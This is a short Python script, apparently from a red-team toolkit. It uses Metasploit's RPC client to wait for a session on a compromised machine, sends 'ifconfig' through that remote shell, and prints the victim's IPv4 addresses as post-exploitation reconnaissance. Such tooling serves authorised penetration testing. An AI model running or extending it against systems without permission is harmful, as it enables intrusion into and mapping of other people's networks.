from time import sleep
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, msf_get_timestamp

client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
id = msf_wait_for_session.run(client)
shell = client.sessions.session(id)
if(shell is None):
    print("time out, no shell :(")
else:
    shell.write('ifconfig\n')
    r = ''
    while len(r) == 0:
        r = shell.read() # don't access shell in Armitage/msfconsole
    
    interfaces = dict()
    for l1 in r.split('\n\n'):
        intf = ''
        for l2 in l1.split('\n'):
            if(l2.startswith('Interface')):
                intf = l2.strip()
                interfaces[intf] = dict()
            if(' : ' in l2):
                kv = l2.split(' : ')
                interfaces[intf][kv[0].strip()] = kv[1]
    
    for k1, v1 in interfaces.items():
        print(v1['IPv4 Address'])
            